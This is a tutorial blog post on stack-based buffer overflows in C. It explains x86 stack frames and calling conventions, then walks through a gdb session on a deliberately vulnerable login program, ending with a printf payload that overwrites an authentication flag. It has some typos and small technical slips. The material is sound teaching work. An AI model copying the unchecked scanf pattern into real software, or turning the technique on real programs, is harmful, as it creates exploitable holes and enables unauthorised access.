---
title:  "Stack Based Buffer Overflow Attacks"
date:   2025-11-11
categories: ["reverse engineering"]
tags: ["vulnerabilities", "buffer overflow","reverse engineering"]
author: Sanketh
references:
  
---

# Stack Based Buffer Overflow Attacks

A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).

## Causes of Buffer Overflow Attacks in C

When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:

### 1. C allows writing beyond (and before) array bounds

- Arrays in C are just raw memory. 
- The compiler does not perform runtime checks.
- If you write past `buf[63]`, C simply writes into whatever memory comes next.


```c
char buf[64];
buf[100] = 'A';   // C happily writes here → overflow
```

No warning, no crash, memory is overwritten silently.

### 2. C strings rely on null termination

C treats strings as a sequence of characters until it encounters a null termination character `\0`

Problems caused by this:

- Functions like `strcpy`, `gets`, `scanf("%s")` keep copying until they hit a null byte — not until the buffer ends.
- If input lacks a null terminator early enough, it will overflow.

### 3. Direct pointer arithmetic

C allows writing to any address you compute.

```c
*(buf + 80) = 'X';
```

Since the memory layout of a program was quite predictable before the mitigations like ASLR arrived, attackers could easily calculate which address needs to be overwritten with what value.

## What is Stack?

Stack is a segment of memory where the process stores function context: particularly function calls and its local variables. 

Before Stack, programmers didn't have a definite way of doing these things:
- Where to store function arguments
- Where to store local variables
- Where to store the return address (so CPU knows where to go back)
- How to make function calls nested (A → B → C → D …)
- How to handle recursion (function calling itself multiple times)

Some of the earlier assembly languages didn't have the concept of stack, programmers had to simulate the stack on their own on a raw block of memory. Today all the mainstream CPU's have support for stack at the hardware level.

### Why a stack specifically (LIFO)?

Function calls behave naturally like a Last-In-First-Out structure.

Example:

```
main calls A
A calls B
B calls C
```

Order of returning:

```
C returns to B
B returns to A
A returns to main
```

This is literally a LIFO pattern, a stack is the perfect structure.

### Structure of a Stack Frame

A stack frame is a single entry in the call stack that contains all the local variables and metadata associated with a function invocation. In a nested function call chain, each function maintains its own distinct stack frame, creating a LIFO (Last-In-First-Out) structure.

**Register Management in x86:**
- The **EBP (Base Pointer)** register marks the base of the currently active stack frame
- The **ESP (Stack Pointer)** register points to the top of the stack

**The Reality of Function Calls:**

While high-level languages like C use function call syntax, the underlying assembly implementation is fundamentally different. At the assembly level, there is no native concept of "functions"—each function call is simply a jump to a different memory location containing executable instructions.

This creates an important challenge: since function calls are just jumps, how do the caller and callee exchange information? How are parameters passed? Where should return values be placed? 

**The Application Binary Interface (ABI):**

The solution is the ABI—a standardized calling convention that defines the contract between caller and callee. The ABI specifies:
- How arguments are passed (registers vs. stack)
- Which registers are preserved across calls
- Where return values are stored
- How the stack frame is set up and torn down

Without this agreement, function calls across separately compiled code would be impossible, as each piece of code would have different expectations about parameter passing and register usage.

Let's take an example

```c
int main() {
    A(5);
}

void A(int a) {
    B(3);
}

void B(int b) {
    int local_var1;
    char local_var2;
}

```

The stack for this code when C is called will look like this:

```
Higher Memory Addresses (0xFFFFFFFF)
↑
|
|                    STACK GROWTH DIRECTION
|                           ↓↓↓
|
+------------------+
|   Arguments      |  ← Arguments for function A (if any)
|   for A          |
+------------------+
|   Return Addr    |  ← Where to return after A finishes (e.g., main)
|   to main        |
+------------------+
|   Saved EBP      |  ← main's base pointer
|   (main's frame) |
+------------------+ ← EBP when A is executing (A's frame base)
|   A's Local      |
|   Variables      |
|   - local_var1   |
|   - local_var2   |
+------------------+
|   Arguments      |  ← Arguments pushed for B (right to left in C)
|   for B          |    e.g., arg2, arg1
+------------------+
|   Return Addr    |  ← Where to return in A after B finishes
|   to A           |
+------------------+
|   Saved EBP      |  ← A's base pointer saved
|   (A's frame)    |
+------------------+ ← EBP (Current frame base - B is executing)
|   B's Local      |
|   Variables      |
|   - local_var1   |
|   - local_var2   |
+------------------+ ← ESP (Stack pointer - top of stack)
|                  |
|   (Unused        |
|    Stack         |
|    Space)        |
|                  |
↓
Lower Memory Addresses (0x00000000)
```

### What Happens During a Function Call

Now let's look at thx86 assembly code for what happens when a function is called

#### 1. Caller's Responsibilities (Before the Jump):

First, the caller must save the return address—the location where execution should resume after the function completes. Let's see what happens when function A calls function B.

```
push arguments_to_function_B (pushed in reverse order)
push next_instruction_address_of_function_A (the value in EIP register)
jmp address_of_function_B 
```

Sometimes the Caller can also decide to save all the values of general purpose registers to avoid losing its values from being overwritten by the caller. 

```
; Function A calling Function B with register preservation

function_A:
    ; ... A's code using registers ...
    mov eax, 100        ; EAX has important data
    mov ebx, 200        ; EBX has important data
    mov ecx, 300        ; ECX has important data
    
    ; Prepare to call B
    pusha               ; Push all general-purpose registers onto stack
                        ; Order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI
    
    push arguments_to_function_B    ; (pushed in reverse order)
    push next_instruction_address_of_function_A ; (the value in EIP register)
    jmp address_of_function_B

    popa                ; Restore all registers to their original values
                        ; Now EAX=100, EBX=200, ECX=300 again
    
    ; Continue with A's logic, registers are preserved
    ; ...
```

Most of the times callee's ABI clearly defines what register values are preserved and what can be overwritten, we can only save those registers instead.


#### 2. Callee's Responsibilities (Function Prologue):

Once inside the function B, we need to set up a new stack frame:

```
address_of_function_B:
    push ebp              ; Save the old base pointer (of function A)
    mov ebp, esp          ; Set EBP to current stack top (new frame base)
    sub esp, N            ; Allocate space for local variables (N bytes)
```

This sequence accomplishes three things:
- Preserves the caller's frame pointer (old EBP) so we can restore it late
- Establishes a new base pointer for the current function
- Allocates stack space for local variables by moving ESP downward

#### 3. Function Execution:

The function body executes, with local variables accessible via offsets from EBP:

- `[ebp-4]` accesses the first local variable
- `[ebp-8]` accesses the second, and so on
- Function parameters (if pushed by caller) are at `[ebp+8]`, `[ebp+12]`, etc.

#### 4. Callee's Responsibilities (Function Epilogue):

Before returning, we must tear down the stack frame and restore state:

```
    mov esp, ebp          ; Deallocate local variables (restore ESP)
    pop ebp               ; Restore the old base pointer
    ret_address = pop()   ; Get return address from stack
    jmp ret_address       ; Jump back to caller
```

This will:

- Collapses the function B's stack frame by resetting `ESP` to `EBP`
- Restores the caller's base pointer
- Retrieves the return address from the stack (saved by function A)
- Jumps back to continue execution after the original call site


### Simplified Function Call with CALL/RET/LEAVE

The x86 instruction set provides three specialized instructions that automate this process:

#### The CALL Instruction:

```
call function_address
```

This single instruction replaces:

```
push next_instruction_address
jmp function_address
```

It automatically pushes the return address (address of the instruction following `call`) onto the stack and jumps to the target function.

#### The LEAVE Instruction:

```
leave
```

This single instruction replaces:

```
mov esp, ebp
pop ebp
```

It efficiently collapses the stack frame and restores the old base pointer in one operation.

#### The RET Instruction:

```
ret
```

This single instruction replaces:

```
pop eip          ; Pop return address into instruction pointer
jmp eip          ; Jump to return address
```

#### Complete Example with Simplified Instructions:

```
; Caller side:
push argument2
push argument1
call my_function        ; Pushes return address and jumps
add esp, 8             ; Clean up arguments (caller cleanup)

; Callee side:
my_function:
    push ebp           ; Save old frame pointer
    mov ebp, esp       ; Set up new frame
    sub esp, 16        ; Allocate local variables
    
    ; ... function body ...
    
    leave              ; Equivalent to: mov esp, ebp; pop ebp
    ret                ; Pop return address and jump to it
```

## Buffer OverFlow Attacks

### 1. Overflowing a Variable On Stack

Consider this C program

```c
#include <stdio.h>
#include <string.h>


void grantAccess() {
	printf("Access Granted\n");
}

void checkPassword(char* password, int *isAuthenticated) {

	if (strcmp(password, "admin123") == 0) {
		*isAuthenticated = 1;
	}
}


void AuthenticateUser() {
	int  isAuthenticated = 0;
	char password[8];

	printf("Enter password: ");
	scanf("%s", password);

	checkPassword(password, &isAuthenticated);

	if (isAuthenticated == 1) {
		grantAccess();
	} else {
		printf("Authentication Failed\n");
	}

}

int main() {
	AuthenticateUser();
}
```

This is the normal working of the program

```
$ gcc main.c
$ ./a.out
Enter password: password
Authentication Failed
$ ./a.out
Enter password: admin123
Access Granted
```

What if we don't know the correct password? Can we still gain access?

The vulnerability lies in `scanf("%s", password);` which performs no bounds checking. This allows us to write more than 8 bytes into the `password` buffer, potentially overwriting adjacent stack variables—specifically, the `isAuthenticated` variable.

**Stack layout when `AuthenticateUser()` is executing:**
```
Higher Addresses
+-------------------------+
| Saved return address    | ← Return address to main()
+-------------------------+
| Saved RBP               | ← Previous stack frame base
+-------------------------+ ← RBP (current frame base)
| isAuthenticated (4 bytes) | ← [RBP-4]
+-------------------------+
| padding (if any)        |
+-------------------------+
| password[8]             | ← [RBP-12] (buffer starts here)
+-------------------------+ ← RSP (stack pointer)
Lower Addresses
```

Now let's compile another version of the code known as `vuln`

```
$ gcc -fno-stack-protector  -O0 -o vuln  main.c
```

**Why `-fno-stack-protector?`**

The `-fno-stack-protector` flag disables GCC's Stack Smashing Protector (SSP), also known as Stack Guard or ProPolice.

The Stack Guard's main feature is stack canary - although the existence of stsck canary doesn't stop this attack, we still need to disable it because Stack Guard also reorders the variables in stack such that `isAuthenticated` appears after `password`, so we would never be able to rewrite the password. 

`-O0` will disable all compiler optimizations, so we can see all the assembly code.

Let's start by printing the disassembly of the key functions

```bash
(gdb) disass AuthenticateUser
Dump of assembler code for function AuthenticateUser:
   0x00000000000011fe <+0>:	endbr64
   0x0000000000001202 <+4>:	push   rbp
   0x0000000000001203 <+5>:	mov    rbp,rsp
   0x0000000000001206 <+8>:	sub    rsp,0x10
   0x000000000000120a <+12>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000001211 <+19>:	lea    rax,[rip+0xe04]        # 0x201c
   0x0000000000001218 <+26>:	mov    rdi,rax
   0x000000000000121b <+29>:	mov    eax,0x0
   0x0000000000001220 <+34>:	call   0x1090 <printf@plt>
   0x0000000000001225 <+39>:	lea    rax,[rbp-0xc]
   0x0000000000001229 <+43>:	mov    rsi,rax
   0x000000000000122c <+46>:	lea    rax,[rip+0xdfa]        # 0x202d
   0x0000000000001233 <+53>:	mov    rdi,rax
   0x0000000000001236 <+56>:	mov    eax,0x0
   0x000000000000123b <+61>:	call   0x10b0 <__isoc99_scanf@plt>
   0x0000000000001240 <+66>:	lea    rdx,[rbp-0x4]
   0x0000000000001244 <+70>:	lea    rax,[rbp-0xc]
   0x0000000000001248 <+74>:	mov    rsi,rdx
   0x000000000000124b <+77>:	mov    rdi,rax
   0x000000000000124e <+80>:	call   0x11c3 <checkPassword>
   0x0000000000001253 <+85>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001256 <+88>:	cmp    eax,0x1
   0x0000000000001259 <+91>:	jne    0x1267 <AuthenticateUser+105>
   0x000000000000125b <+93>:	mov    eax,0x0
   0x0000000000001260 <+98>:	call   0x11a9 <grantAccess>
   0x0000000000001265 <+103>:	jmp    0x1276 <AuthenticateUser+120>
   0x0000000000001267 <+105>:	lea    rax,[rip+0xdc2]        # 0x2030
   0x000000000000126e <+112>:	mov    rdi,rax
   0x0000000000001271 <+115>:	call   0x1080 <puts@plt>
   0x0000000000001276 <+120>:	nop
   0x0000000000001277 <+121>:	leave
   0x0000000000001278 <+122>:	ret
End of assembler dump.
(gdb) disass checkPassword
Dump of assembler code for function checkPassword:
   0x00000000000011c3 <+0>:	endbr64
   0x00000000000011c7 <+4>:	push   rbp
   0x00000000000011c8 <+5>:	mov    rbp,rsp
   0x00000000000011cb <+8>:	sub    rsp,0x10
   0x00000000000011cf <+12>:	mov    QWORD PTR [rbp-0x8],rdi
   0x00000000000011d3 <+16>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000000011d7 <+20>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000011db <+24>:	lea    rdx,[rip+0xe31]        # 0x2013
   0x00000000000011e2 <+31>:	mov    rsi,rdx
   0x00000000000011e5 <+34>:	mov    rdi,rax
   0x00000000000011e8 <+37>:	call   0x10a0 <strcmp@plt>
   0x00000000000011ed <+42>:	test   eax,eax
   0x00000000000011ef <+44>:	jne    0x11fb <checkPassword+56>
   0x00000000000011f1 <+46>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000011f5 <+50>:	mov    DWORD PTR [rax],0x1
   0x00000000000011fb <+56>:	nop
   0x00000000000011fc <+57>:	leave
   0x00000000000011fd <+58>:	ret
End of assembler dump.
```

By looking at the assembly of `AuthenticateUser` we can pinpoint where `isAuthenticated` and `password` are located on stack.

1. `isAuthenticated` at `[rbp-0x4]`

```asm
0x120a <+12>: mov    DWORD PTR [rbp-0x4],0x0
```

this is writing 0 to the address [rbp-0x4], which is equivalent to the C code

```c
int isAuthenticated = 0;  // Initialize to 0
```

2. `password` is at `[rbp-0xc]`

We can just figure it out by looking at the arguments passed to `checkPassword`

```
0x1240 <+66>: lea    rdx,[rbp-0x4]             ; Load address of [rbp-0x4]
0x1244 <+70>: lea    rax,[rbp-0xc]             ; Load address of [rbp-0xc]
0x1248 <+74>: mov    rsi,rdx                   ; 2nd arg: &isAuthenticated
0x124b <+77>: mov    rdi,rax                   ; 1st arg: password
0x124e <+80>: call   0x11c3 <checkPassword>
```

We know `rdi` contains first password and `rsi` contains second, from C code we can see first parameter is `password` and second parameter is `isAuthenticated`.

Now let's place a breakpoint right before this code

```c
	if (isAuthenticated == 1) {
```

We can spot the corresponding `cmp` assembly operation here

```
   0x000000000000124e <+80>:	call   0x11c3 <checkPassword>
   0x0000000000001253 <+85>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001256 <+88>:	cmp    eax,0x1
   0x0000000000001259 <+91>:	jne    0x1267 <AuthenticateUser+105>
   0x000000000000125b <+93>:	mov    eax,0x0
   0x0000000000001260 <+98>:	call   0x11a9 <grantAccess>
   0x0000000000001265 <+103>:	jmp    0x1276 <AuthenticateUser+120>
```

Note that `b *0x0000000000001256` won't work because the addresses we are seeing are the offsets in ELF. But since our binary is a PIE executable there will be a constant offset added, we can figure out the actual address using that offset or we can simply place it like this

```bash
(gdb)  break *AuthenticateUser+88
Breakpoint 4 at 0x555555555256
```

GDB allows this since the relative offsets will same and it is aware of the symbols. 

Now let's enter the password

```bash
(gdb) c
Continuing.
Enter password: AAAAAAAA1

Breakpoint 4, 0x0000555555555256 in AuthenticateUser ()
```

`AAAAAAAA1` is 9 bytes, just 1 byte more than password. Let's inspect the memory to confirm if the overflow happened.

```
(gdb) x/12xb $rbp - 0xc
0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddfc:	0x31	0x00	0x00	0x00
(gdb) x/1dw $rbp - 0x4
0x7fffffffddfc:	49
```

Recall that `$rbp - 0xc` is the address of `password` and `$rbp - 0x4` is the address of `isAuthenticated`. 

In first command we are printing 12 bytes from `0x7fffffffddf4` we can see 9th byte is `0x31` which is the ascii value of `1` we entered at the end. 

But since the value stored is not `0x01` we can see the value of `isAuthenticated` is not `49` which will still fail the check.

```bash
(gdb) c
Continuing.
Authentication Failed
[Inferior 1 (process 8454) exited normally]
```

Now we know that overflow actually works, we can actually try to voerwrite `0x01` into the address of `isAuthenticated`. This is the scenario we are hoping for

```
0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddfc:	0x01	0x00	0x00	0x00
```

Note that the bytes `0x01	0x00	0x00	0x00` appear reversed compared to the actual notation of 1 in 4-byte (word) format because this is little-endian representation.

The problem is the character whose ascii value is `0x01` is actually a non-printable character which means we can't type it into the terminal. 

But we can pass raw byte stream using utilities like `printf` and pipe its output to our program

```
$ printf 'AAAAAAAA\x01' | ./vuln
Enter password: Access Granted
```

This proves that the overwrite worked in an expected way!





